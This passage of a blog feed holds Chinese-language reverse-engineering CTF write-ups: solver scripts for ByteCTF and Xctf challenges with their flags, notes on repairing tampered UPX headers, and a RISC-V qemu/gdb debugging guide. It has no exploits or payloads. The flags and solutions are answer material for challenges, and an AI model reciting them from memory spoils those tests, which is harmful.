class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">220</span>);</span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">18</span>;</span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">23</span>;</span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">9</span>;</span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">15</span>;</span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">10</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">20</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">19</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">25</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">24</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">22</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">12</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">16</span>;</span><br><span class="line">v4[<span class="number">16</span>] = <span class="number">2</span>;</span><br><span class="line">v4[<span class="number">17</span>] = <span class="number">17</span>;</span><br><span class="line">v4[<span class="number">18</span>] = <span class="number">7</span>;</span><br><span class="line">v4[<span class="number">19</span>] = <span class="number">1</span>;</span><br><span class="line">v4[<span class="number">20</span>] = <span class="number">8</span>;</span><br><span class="line">v4[<span class="number">21</span>] = <span class="number">11</span>;</span><br><span class="line">v4[<span class="number">22</span>] = <span class="number">6</span>;</span><br><span class="line">v4[<span class="number">23</span>] = <span class="number">13</span>;</span><br><span class="line">v4[<span class="number">24</span>] = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">220</span>);</span><br><span class="line">v3[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">v3[<span class="number">1</span>] = <span class="number">18</span>;</span><br><span class="line">v3[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">v3[<span class="number">3</span>] = <span class="number">23</span>;</span><br><span class="line">v3[<span class="number">4</span>] = <span class="number">11</span>;</span><br><span class="line">v3[<span class="number">5</span>] = <span class="number">17</span>;</span><br><span class="line">v3[<span class="number">6</span>] = <span class="number">12</span>;</span><br><span class="line">v3[<span class="number">7</span>] = <span class="number">4</span>;</span><br><span class="line">v3[<span class="number">8</span>] = <span class="number">25</span>;</span><br><span class="line">v3[<span class="number">9</span>] = <span class="number">24</span>;</span><br><span class="line">v3[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">v3[<span class="number">11</span>] = <span class="number">20</span>;</span><br><span class="line">v3[<span class="number">12</span>] = <span class="number">19</span>;</span><br><span class="line">v3[<span class="number">13</span>] = <span class="number">15</span>;</span><br><span class="line">v3[<span class="number">14</span>] = <span class="number">13</span>;</span><br><span class="line">v3[<span class="number">15</span>] = <span class="number">10</span>;</span><br><span class="line">v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">v3[<span class="number">17</span>] = <span class="number">21</span>;</span><br><span class="line">v3[<span class="number">18</span>] = <span class="number">7</span>;</span><br><span class="line">v3[<span class="number">19</span>] = <span class="number">22</span>;</span><br><span class="line">v3[<span class="number">20</span>] = <span class="number">8</span>;</span><br><span class="line">v3[<span class="number">21</span>] = <span class="number">3</span>;</span><br><span class="line">v3[<span class="number">22</span>] = <span class="number">9</span>;</span><br><span class="line">v3[<span class="number">23</span>] = <span class="number">2</span>;</span><br><span class="line">v3[<span class="number">24</span>] = <span class="number">16</span>;</span><br><span class="line">v5 = <span class="number">25</span>;</span><br><span class="line">*a1 = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  ++*a1;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v5 - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = v5 - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &gt; (<span class="keyword">int</span>)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5 - <span class="number">1</span>; j &gt;= i &amp;&amp; v4[j] &lt;= v4[i - <span class="number">1</span>]; --j )</span><br><span class="line">    ;</span><br><span class="line">  v2 = i - <span class="number">1</span>;</span><br><span class="line">  v4[i - <span class="number">1</span>] ^= v4[j];</span><br><span class="line">  v4[j] ^= v4[v2];</span><br><span class="line">  v4[i - <span class="number">1</span>] ^= v4[j];</span><br><span class="line">  <span class="keyword">for</span> ( j = v5 - <span class="number">1</span>; i &lt; j; --j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[i] ^= v4[j];</span><br><span class="line">    v4[j] ^= v4[i];</span><br><span class="line">    v4[i++] ^= v4[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; v4[i] == v3[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( i &lt; v5 );</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>​并通过所给文件的最后几行<img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/algo.png" class=""></p><p>​推测是上述算法的运行次数转ASCII就是flag</p><p>​求运行次数这部分是我写的脚本⬇</p><p>​通过找每一次执行的输出结果的规律，得到计算执行次数的方法</p><p>​<img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/number.png" class=""></p><p>​这一段可以看出要从序列末尾 <code>11 3 6 8 13</code> 变为 <code>13 3 6 8 11</code> 需要执行的次数是 4!，即一个数变成后面序列中比它稍大的数（只大一个），并且后面的序列为升序的次数是后面序列数字个数的阶乘</p><p>​那就可以算出从 <code>5, 18, 14, 23, 9, 1, 2, 3, 4, 6, 7, 8, 10, 11, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25</code> 变化到 <code>5, 18, 14, 23, 11, 1, 2, 3, 4, 6, 7, 8, 9, 10, 12, 13, 15, 16, 17, 19, 20, 21, 22, 24, 25</code> 的次数是 2*20!</p><p>​之后减去和增加剩余的部分就可以得到最终执行的次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">dst = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>]</span><br><span class="line">src = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>]</span><br><span class="line">dst2 = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">16</span>]</span><br><span class="line">src2 = [<span class="number">5</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="number">2</span>*math.factorial(<span class="number">20</span>)</span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line">factor = <span class="number">19</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="built_in">len</span>(src)):</span><br><span class="line">    ans+=(src.index(dst[i])-i)*math.factorial(factor)</span><br><span class="line">    factor-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(src.index(dst[i]),i,-<span class="number">1</span>):</span><br><span class="line">        src[j]=src[j-<span class="number">1</span>]</span><br><span class="line">    src[i]=dst[i]</span><br><span class="line"></span><br><span class="line">ans2 = <span class="number">0</span></span><br><span class="line">factor = <span class="number">19</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="built_in">len</span>(src2)):</span><br><span class="line">    ans2+=(src2.index(dst2[i])-i)*math.factorial(factor)</span><br><span class="line">    factor-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(src2.index(dst2[i]),i,-<span class="number">1</span>):</span><br><span class="line">        src2[j]=src2[j-<span class="number">1</span>]</span><br><span class="line">    src2[i]=dst2[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(result - ans + ans2))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x27;Qw021zbG&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ByteService（未完成）">ByteService（未完成）</h2><p>​<strong>这题并没有做出来，还差最后的 java 逆向，这里先记录一下已有的进度，然后就等官方 wp 了</strong></p><p>​首先看 apk 反编译结果发现是实现了一个进程通信，反编译出来的是客户端代码，而服务端是在题目描述里下载得到的sdk</p><p>​<code>Android Studio</code> 下一个版本对应的 sdk，用从 xml 下载得到的  zip 替换已有 sdk 目录下的<code>system-images</code> 里的文件，开模拟器打开 apk 测试可以得到</p><img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/test.png" class=""><p>​输入是16个字符的时候能够得到最底下显示的内容（apk实际上没有调用 checkCTFService 函数）</p><img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/check.png" class=""><p>​<code>adb shell service list</code>可以查看开的系统服务，这里可以看到自定义了一个服务</p><img src="/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/service.png" class=""><p>​查资料可以知道 <code>/system/framework</code> 目录下存的是 sdk 核心文件，<code>services.jar</code> 里是系统服务的代码。找到 <code>com.android.server.os.ByteCTFService</code> 可以看到 flag 的验证部分，而<code>com.bytedance.bytectf.A</code> 和 <code>android.os.IByteCTFService</code> 这两个类在 <code>framework.jar</code> 里面</p><p>​之后就是逆向的过程，使用了 java 的 lambda 函数，然后那一堆函数就看不懂了</p><h2 id="参考资料">参考资料</h2><ul><li><a href="https://blog.csdn.net/happy_horse/article/details/51733492">Android进程间通信（一）：使用Parcel对象完成进程间通信</a></li><li><a href="https://bbs.pediy.com/thread-221291.htm">android系统服务的查找</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;ByteCTF 中部分逆向题的wp&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>UPX 壳反解压技术</title>
    <link href="https://www.0wl.site/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/"/>
    <id>https://www.0wl.site/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/</id>
    <published>2021-10-04T08:34:40.000Z</published>
    <updated>2021-10-04T09:49:10.807Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>TSGCTF optimized 中用到的 UPX 壳的反解压</p></div></article><span id="more"></span><h2 id="判断是否加壳">判断是否加壳</h2><ul><li>不标准的段名，静态链接</li><li>找不到输出字符串</li><li>entry point 在其他地方</li></ul><p>一些通过 upx 压缩的文件可能不会被识别为 upx 压缩过的，基本上是通过更改文件头中的一些数据实现的（可根据 upx -d 的报错判断）</p><h2 id="upx-文件头结构">upx 文件头结构</h2><img src="/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/upxstruct.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">b_info</span> // 12-<span class="title">byte</span> <span class="title">header</span> <span class="title">before</span> <span class="title">each</span> <span class="title">compressed</span> <span class="title">block</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> sz_unc; <span class="comment">// uncompressed_size</span></span><br><span class="line"><span class="keyword">uint32_t</span> sz_cpr; <span class="comment">// compressed_size</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_method; <span class="comment">// compression algorithm</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_ftid; <span class="comment">// filter id</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_cto8; <span class="comment">// filter parameter</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_unused; <span class="comment">// unused</span></span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">l_info</span> // 12-<span class="title">byte</span> <span class="title">trailer</span> <span class="title">in</span> <span class="title">header</span> <span class="title">for</span> <span class="title">loader</span> (<span class="title">offset</span> 116)</span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> l_checksum; <span class="comment">// checksum</span></span><br><span class="line"><span class="keyword">uint32_t</span> l_magic; <span class="comment">// UPX! magic [55 50 58 21]</span></span><br><span class="line"><span class="keyword">uint16_t</span> l_lsize; <span class="comment">// loader size</span></span><br><span class="line"><span class="keyword">uint8_t</span> l_version; <span class="comment">// version info</span></span><br><span class="line"><span class="keyword">uint8_t</span> l_format; <span class="comment">// UPX format </span></span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">p_info</span> // 12-<span class="title">byte</span> <span class="title">packed</span> <span class="title">program</span> <span class="title">header</span> <span class="title">follows</span> <span class="title">stub</span> <span class="title">loader</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> p_progid; <span class="comment">// program header id [00 00 00 00]</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_filesize; <span class="comment">// filesize [same as blocksize]</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_blocksize; <span class="comment">// blocksize [same as filesize] </span></span><br><span class="line"></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>现在主要伪造的是 p_info ,l_info 里的内容，在b_info 暂时还没有伪造方法</p><h2 id="复原">复原</h2><img src="/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/edit1.png" class=""><img src="/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/edit2.png" class=""><p>都改成 UPX！ 就能 upx -d 解压了</p><h2 id="无法用以上方法复原的情况">无法用以上方法复原的情况</h2><p>可以考虑用 gdb 调试，gcore 命令获取内存状况</p><p>也可以尝试用 radare2 解压内存</p><p>因为 upx 是开源的，所以有时候压缩方式会遭到更改</p><h2 id="参考链接">参考链接</h2><ul><li><a href="https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/">https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/</a></li><li><a href="https://hackmd.io/@ishitatsuyuki/B1MDOgw4Y">https://hackmd.io/@ishitatsuyuki/B1MDOgw4Y</a></li><li><a href="https://github.com/radareorg/r2con2018/blob/master/talks/unpacking/Unpacking-a-Non-Unpackables.pdf">https://github.com/radareorg/r2con2018/blob/master/talks/unpacking/Unpacking-a-Non-Unpackables.pdf</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;TSGCTF optimized 中用到的 UPX 壳的反解压&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="upx" scheme="https://www.0wl.site/tags/upx/"/>
    
  </entry>
  
  <entry>
    <title>Xctf进阶-Junk_Instruction</title>
    <link href="https://www.0wl.site/2021/07/21/Xctf-Junk-Instruction/"/>
    <id>https://www.0wl.site/2021/07/21/Xctf-Junk-Instruction/</id>
    <published>2021-07-21T03:06:27.000Z</published>
    <updated>2021-07-21T09:53:45.121Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>一道 MFC 题，之前找验证函数是查看字符串，但在这题里不奏效，学一下根据控件 id 找函数</p></div></article><span id="more"></span><p>patch 过的程序  <a href="/2021/07/21/Xctf-Junk-Instruction/Junk_Instruction.exe">Junk Instruction.exe</a></p><h2 id="找关键函数">找关键函数</h2><p>首先查找字符串 <code>CDialog</code> ，之后在这个字符串位置下方查看到消息映射表，在 ida 中建立如下两个结构体，分别设置类型</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc3.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">const</span> AFX_MSGMAP* (PASCAL* pfnGetBaseMap)();</span><br><span class="line">  <span class="keyword">const</span> AFX_MSGMAP_ENTRY* lpEntries;<span class="comment">//指向下面这个结构体</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UINT nMessage;</span><br><span class="line">    UINT nCode;</span><br><span class="line">    UINT nID;<span class="comment">//控件id</span></span><br><span class="line">    UINT nLastID;</span><br><span class="line">    UINT_PTR nSig;</span><br><span class="line">    AFX_PMSG pfn;<span class="comment">//对应的函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用 Resource Hacker 可以查看 check 按钮对应的 id</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc4.png" class=""><p>十六进制是 0x3e9，有一些文章里说 alt+i 查找控件 id 可以找到对应函数，但是在这题里好像找不到，所以只能根据父类的消息映射表一个个找子类映射表从而找到控件注册函数，具体寻找方法参考这 <a href="https://blog.csdn.net/SilverMagic/article/details/40622413">使用IDA定位基于MFC的CrackMe的按钮函数-----实践篇（一）</a></p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc.png" class=""><p>在地址 0x57f730（未经调试）处找到对应的入口点</p><h2 id="去花指令">去花指令</h2><p>找到函数后确定 check 函数</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc5.png" class=""><p>在 check 函数可以看到 <code>__asm &#123; retn &#125;</code> 的代码，说明这里存在花指令，而这里主要存在两种花指令</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc6.png" class=""><p>call 指令相当于 push+jump，把 call 下方的地址 push 到栈里再 jump 到对应位置，这里 loc_402953 的 ebx 存放返回地址，inc ebx 把返回地址加一那么返回的地址变成 call 下面的 jump，所以这里的花指令可以把除了 mov eax，11111111h 以外的都 nop 掉</p><img src="/2021/07/21/Xctf-Junk-Instruction/mfc7.png" class=""><p>这种跟上面一样分析可以全 nop 掉</p><p>这题的花指令不算多可以手动修复，当然也可以用 idapython 脚本修复</p><p>都弄好后就可以逆 check 的逻辑</p><h2 id="解密">解密</h2><p>rc4加密，密钥是 <code>qwertyuiop</code> 密文是上面的那些赋值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag=[<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    temp=flag[i]</span><br><span class="line">    flag[i]=flag[<span class="number">31</span>-i]</span><br><span class="line">    flag[<span class="number">31</span>-i]=temp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(flag)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;973387a11fa3f724d74802857d3e052f&#125;</span></span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><ul><li><a href="https://blog.csdn.net/SilverMagic/article/details/40622413">使用IDA定位基于MFC的CrackMe的按钮函数-----实践篇（一）</a></li><li><a href="https://blog.csdn.net/SilverMagic/article/details/40621107">使用IDA定位基于MFC的CrackMe的按钮函数-----理论篇</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;一道 MFC 题，之前找验证函数是查看字符串，但在这题里不奏效，学一下根据控件 id 找函数&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
    <category term="MFC" scheme="https://www.0wl.site/tags/MFC/"/>
    
  </entry>
  
  <entry>
    <title>riscv架构的gdb调试</title>
    <link href="https://www.0wl.site/2021/07/16/riscv%E6%9E%B6%E6%9E%84%E7%9A%84gdb%E8%B0%83%E8%AF%95/"/>
    <id>https://www.0wl.site/2021/07/16/riscv%E6%9E%B6%E6%9E%84%E7%9A%84gdb%E8%B0%83%E8%AF%95/</id>
    <published>2021-07-16T07:28:45.000Z</published>
    <updated>2021-07-16T08:58:02.237Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>有些逆向题会有riscv架构的，总结一下如何利用 qemu 和 gdb 调试 riscv 架构的程序</p></div></article><span id="more"></span><p>​riscv 架构的不能用 ida 反编译，但是 ghidra 可以</p><h2 id="工具准备">工具准备</h2><p>​调试 riscv 架构的程序需要准备专用的 gdb ，<a href="https://xpack.github.io/riscv-none-embed-gcc/releases/">https://xpack.github.io/riscv-none-embed-gcc/releases/</a>  这里面包含各种开发工具，gdb 、gcc 、objdump…（ubuntu 的 gdb-multiarch 不支持 riscv 架构，但是其他一些系统可以）</p><p>​下载完后解压，进入到 bin 目录下就可以使用 gdb</p><p>​qemu 的话直接在官网下载</p><p>​如果安装的 qemu 找不到 riscv 可以参考下这个来安装 <a href="https://pdos.csail.mit.edu/6.828/2019/tools.html">https://pdos.csail.mit.edu/6.828/2019/tools.html</a></p><h2 id="调试">调试</h2><p>​<code>qemu-riscv64 -g 2334 '/home/owl/桌面/main' </code>  -g 开放调试端口</p><p>​<code>./riscv-none-embed-gdb</code></p><p>​开启 gdb 后输入如下命令</p><p>​<code>target remote :2334</code></p><p>​<code>file ./main</code></p><p>​只能用原版 gdb ，gdb 插件会出错</p><h3 id="调试时的一些指令">调试时的一些指令</h3><p>​<code>x /10xi 0x1234</code>：查看对应的反汇编代码</p><p>​<code>info registers</code> ：查看寄存器</p><p>​<code>x /14xb 0x1234</code>：查看内存</p><p>​<code>stepi</code> ：单步执行</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;有些逆向题会有riscv架构的，总结一下如何利用 qemu 和 gdb 调试 riscv 架构的程序&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="riscv" scheme="https://www.0wl.site/tags/riscv/"/>
    
    <category term="gdb" scheme="https://www.0wl.site/tags/gdb/"/>
    
    <category term="qemu" scheme="https://www.0wl.site/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>windows 异常处理</title>
    <link href="https://www.0wl.site/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    <id>https://www.0wl.site/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</id>
    <published>2021-05-23T03:05:05.000Z</published>
    <updated>2021-11-16T14:54:59.283Z</updated>
